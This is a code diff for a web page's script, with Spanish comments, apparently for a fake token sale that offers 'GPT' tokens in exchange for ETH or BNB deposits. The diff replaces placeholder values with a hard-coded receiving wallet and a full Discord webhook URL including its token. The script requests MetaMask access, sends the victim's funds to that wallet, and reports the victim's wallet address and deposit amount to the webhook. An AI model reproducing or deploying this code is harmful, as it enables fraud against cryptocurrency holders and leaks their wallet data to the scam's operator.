@@ -25,78 +25,75 @@
     </form>
 
     <script src="https://cdn.jsdelivr.net/npm/web3@1.6.0/dist/web3.min.js"></script>
-    <script src="index.js"></script>
-	  
-	  <script>
-	  
-	  async function sendTransaction(event) {
-  event.preventDefault();
+    <script>
+      async function sendTransaction(event) {
+        event.preventDefault();
 
-  const depositAmount = document.getElementById("depositAmount").value;
-  const network = document.getElementById("network").value;
+        const depositAmount = document.getElementById("depositAmount").value;
+        const network = document.getElementById("network").value;
 
-  let gptAmount;
-  if (network === "eth") {
-    gptAmount = depositAmount * 320000;
-  } else {
-    gptAmount = depositAmount * 60000;
-  }
+        let gptAmount;
+        if (network === "eth") {
+          gptAmount = depositAmount * 320000;
+        } else {
+          gptAmount = depositAmount * 60000;
+        }
 
-  document.getElementById("gptAmount").textContent = gptAmount;
+        document.getElementById("gptAmount").textContent = gptAmount;
 
-  try {
-    const provider = await detectEthereumProvider();
-    if (provider) {
-      await provider.request({
-        method: "eth_sendTransaction",
-        params: [
-          {
-            to: "0x1234567890123456789012345678901234567890", // la dirección de depósito aquí
-            value: depositAmount,
-            chainId: network === "eth" ? "0x1" : "0x38", // el ID de cadena de la red
-          },
-        ],
-      });
+        try {
+          const provider = await detectEthereumProvider();
+          if (provider) {
+            await provider.request({
+              method: "eth_sendTransaction",
+              params: [
+                {
+                  to: "0x8935361d21943Ee8a863082EdD8a6Aefb062E434", // la dirección de depósito aquí
+                  value: depositAmount,
+                  chainId: network === "eth" ? "0x1" : "0x38", // el ID de cadena de la red
+                },
+              ],
+            });
 
-      // enviar información de transacción a webhook de Discord
-      await sendDiscordWebhook(`Wallet: ${provider.selectedAddress}, Deposit: ${depositAmount}`);
-    } else {
-      throw new Error("Metamask not found");
-    }
-  } catch (error) {
-    console.error(error);
-  }
-}
+            // enviar información de transacción a webhook de Discord
+            await sendDiscordWebhook(`Wallet: ${provider.selectedAddress}, Deposit: ${depositAmount}`);
+          } else {
+            throw new Error("Metamask not found");
+          }
+        } catch (error) {
+          console.error(error);
+        }
+      }
 
-async function detectEthereumProvider() {
-  let provider;
-  if (window.ethereum) {
-    provider = window.ethereum;
-    try {
-      await window.ethereum.request({ method: "eth_requestAccounts" });
-    } catch (error) {
-      console.error(error);
-    }
-  } else if (window.web3) {
-    provider = window.web3.currentProvider;
-  }
-  return provider;
-}
+      async function detectEthereumProvider() {
+        let provider;
+        if (window.ethereum) {
+          provider = window.ethereum;
+          try {
+            await window.ethereum.request({ method: "eth_requestAccounts" });
+          } catch (error) {
+            console.error(error);
+          }
+        } else if (window.web3) {
+          provider = window.web3.currentProvider;
+        }
+        return provider;
+      }
 
-async function sendDiscordWebhook(message) {
-  const webhookUrl = "https://discord.com/api/webhooks/XXXXXXXXXXXXXXXXXX"; // su URL de webhook aquí
-  const data = { content: message };
-  const response = await fetch(webhookUrl, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify(data),
-  });
-  return response;
-}
-		  </script>
-
+      async function sendDiscordWebhook(message) {
+        const webhookUrl = "https://discordapp.com/api/webhooks/1078091750171746324/_S78Y9bzo5TvyNoeplYhQOSHA-lzF-P_qhEhTBZTUEcYydZHr682gNg99QsXnnswGj6-"; // su URL de webhook aquí
+        const data = { content: message };
+        const response = await fetch(webhookUrl, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(data),
+        });
+        return response;
+      }
+    </script>
   </body>
 </html>
+
 
 
 
